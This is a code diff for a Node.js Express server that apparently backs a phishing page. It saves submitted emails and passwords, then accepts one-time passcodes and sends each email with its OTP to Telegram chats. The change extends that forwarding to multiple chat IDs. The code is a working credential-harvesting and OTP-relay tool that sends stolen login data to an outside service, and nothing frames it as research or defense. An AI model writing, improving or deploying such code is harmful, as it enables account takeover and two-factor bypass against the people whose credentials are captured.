@@ -1,6 +1,6 @@
 const express = require('express');
 const cors = require('cors');
-const db = require('./db'); // Now using sqlite3
+const db = require('./db');
 const bcrypt = require('bcryptjs');
 const axios = require('axios');
 require('dotenv').config();
@@ -15,28 +15,29 @@ process.on('unhandledRejection', (err) => console.error('❌ Unhandled Rejection
 app.use(cors());
 app.use(express.json());
 
-// Telegram sender
+// Telegram message sender (multi-chat support)
 async function sendTelegramMessage(message) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
+  const chatIds = process.env.TELEGRAM_CHAT_IDS?.split(',') || [];
 
-  try {
-    const res = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      chat_id: chatId,
-      text: message,
-    });
-    console.log("✅ Telegram message sent:", res.data);
-  } catch (err) {
-    console.error("❌ Telegram error:", err.response?.data || err.message);
+  for (const chatId of chatIds) {
+    try {
+      const res = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: chatId.trim(),
+        text: message,
+      });
+      console.log(`✅ Message sent to ${chatId.trim()}:`, res.data);
+    } catch (err) {
+      console.error(`❌ Telegram error for ${chatId.trim()}:`, err.response?.data || err.message);
+    }
   }
 }
 
-// Save login
+// POST /login → Save login data and remember email
 app.post('/login', (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password are required' });
 
-  // Check if user exists
   const query = `
     SELECT id FROM submissions
     WHERE type = 'login'
@@ -65,6 +66,7 @@ app.post('/login', (req, res) => {
           return res.status(500).json({ error: 'Server error' });
         }
 
+        // Store latest email
         app.locals.lastEmail = email;
         return res.status(200).json({ message: 'Login successful' });
       }
@@ -72,7 +74,7 @@ app.post('/login', (req, res) => {
   });
 });
 
-// Save OTP and notify Telegram
+// POST /otp → Save OTP and send email+otp via Telegram
 app.post('/otp', async (req, res) => {
   const { code } = req.body;
 
@@ -93,7 +95,7 @@ app.post('/otp', async (req, res) => {
       }
 
       const email = app.locals.lastEmail || 'unknown';
-      await sendTelegramMessage(`🧾 New submission:\n📧 Email: ${email}\n🔐 OTP: ${code}`);
+      await sendTelegramMessage(`🧾 New Submission\n📧 Email: ${email}\n🔐 OTP: ${code}`);
 
       return res.status(200).json({ message: 'OTP received' });
     }
